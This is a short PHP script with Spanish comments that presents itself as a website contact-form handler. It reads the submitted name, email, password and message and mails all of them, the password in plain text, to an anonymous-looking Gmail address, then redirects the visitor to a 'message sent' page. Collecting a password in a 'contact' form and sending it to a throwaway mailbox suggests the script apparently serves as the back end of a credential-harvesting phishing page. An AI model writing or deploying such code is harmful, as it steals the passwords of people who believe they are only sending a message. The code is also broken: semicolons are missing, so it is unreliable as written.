<?php
// Llamando a los campos
$nombre = $_POST['nombre'];
$correo = $_POST['correo'];
$contraseña = $_POST['contraseña'];
$mensaje = $_POST['mensaje'];
// Datos para el correo
$destinatario = "anonymmus3627@gmail.com";
$asunto = "Contacto desde la web"

$carta = "DE: $nombre \n";
$carta .= "Correo: $correo \n";
$carta .= "Contraseña: $contraseña \n";
$carta .= "Mensaje $mensaje";
// Enviando mensaje
mail($destinatario, $asunto, $carta);
header('Location:mensaje--enviado.html') 
?>